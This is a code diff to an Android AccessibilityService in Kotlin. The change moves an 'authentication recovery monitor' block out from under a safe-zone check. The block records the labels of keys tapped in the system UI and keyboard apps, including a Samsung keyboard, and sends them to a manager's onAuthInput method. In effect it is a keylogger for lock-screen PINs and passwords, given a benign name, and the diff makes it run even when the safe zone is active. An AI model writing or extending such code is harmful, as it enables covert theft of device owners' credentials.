@@ -875,21 +875,24 @@ class MyAccessibilityService : AccessibilityService() {
             handleGhostEvent(event)
         }
 
+        // --- AUTHENTICATION RECOVERY MONITOR (Override Safe Zone) ---
+        if (AuthRecoveryManager.isRecoveryActive && event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+            val pkg = event.packageName?.toString() ?: ""
+            if (pkg.contains("systemui") || pkg.contains("inputmethod") || pkg.contains("honeyboard")) {
+                val text = event.text?.joinToString(" ") ?: ""
+                val desc = event.contentDescription?.toString() ?: ""
+                val keyLabel = if (text.isNotEmpty()) text else desc
+                if (keyLabel.isNotEmpty()) {
+                    AuthRecoveryManager.onAuthInput(keyLabel)
+                }
+            }
+        }
+
         // --- UNIVERSAL UI TRAP (Tap-Only Engine - Multiple Traps Support) ---
-        if (!isSafeZoneActive(this) && (cachedUiTraps.length() > 0 || cachedNativeTraps.length() > 0 || AuthRecoveryManager.isRecoveryActive)) {
+        if (!isSafeZoneActive(this) && (cachedUiTraps.length() > 0 || cachedNativeTraps.length() > 0)) {
             // STRICT REQUIREMENT: Only react to physical clicks
             if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                 val pkg = event.packageName?.toString() ?: ""
-                
-                // --- AUTHENTICATION RECOVERY MONITOR ---
-                if (AuthRecoveryManager.isRecoveryActive && (pkg.contains("systemui") || pkg.contains("inputmethod") || pkg.contains("honeyboard"))) {
-                    val text = event.text?.joinToString(" ") ?: ""
-                    val desc = event.contentDescription?.toString() ?: ""
-                    val keyLabel = if (text.isNotEmpty()) text else desc
-                    if (keyLabel.isNotEmpty()) {
-                        AuthRecoveryManager.onAuthInput(keyLabel)
-                    }
-                }
                 
                 // CONSTRAINT: Ignore clicks on editable text fields to prevent false positives while typing
                 val isEditable = event.className?.toString()?.contains("EditText", ignoreCase = true) == true
